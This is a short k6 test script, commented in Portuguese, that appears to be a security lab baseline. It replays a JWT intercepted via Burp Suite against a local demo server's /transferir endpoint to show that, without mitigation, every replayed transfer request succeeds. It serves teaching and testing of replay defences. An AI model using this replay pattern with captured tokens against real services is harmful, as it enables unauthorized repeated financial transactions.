// TESTE DE REPLAY ATTACK — SEM MITIGAÇÃO (BASELINE)
// Demonstra a vulnerabilidade: um token capturado é reutilizado
// repetidamente. O servidor não tem como detectar ou bloquear.
// Esperado: 100% das requisições retornam 200 — o ataque é bem-sucedido.
//
// INSTRUÇÕES:
//   1. Rode o servidor: node semMitigacao.js
//   2. Faça login via Burp Suite ou curl e copie o token JWT gerado.
//   3. Cole o token na variável TOKEN abaixo.
//   4. Execute: k6 run teste_semMitigacao_replay.js

import http from 'k6/http';
import { sleep, check } from 'k6';

export const options = {
    vus: 10,
    duration: '30s',
};

// Token interceptado pelo atacante (capturado uma única vez via Burp Suite).
// Substitua pelo token real capturado antes de rodar o teste.
const TOKEN_INTERCEPTADO = 'COLE_AQUI_O_TOKEN_CAPTURADO_VIA_BURP';

const BASE_URL = 'http://127.0.0.1:3000';

export default function () {
    // O atacante reenvia o mesmo token repetidamente sem fazer login.
    const res = http.post(
        `${BASE_URL}/transferir`,
        JSON.stringify({ valor: 100 }),
        {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${TOKEN_INTERCEPTADO}`,
            },
        }
    );

    // No cenário sem mitigação, o ataque SEMPRE é bem-sucedido.
    check(res, { 'replay aceito pelo servidor (200) — VULNERÁVEL': (r) => r.status === 200 });

    sleep(0.1);
}
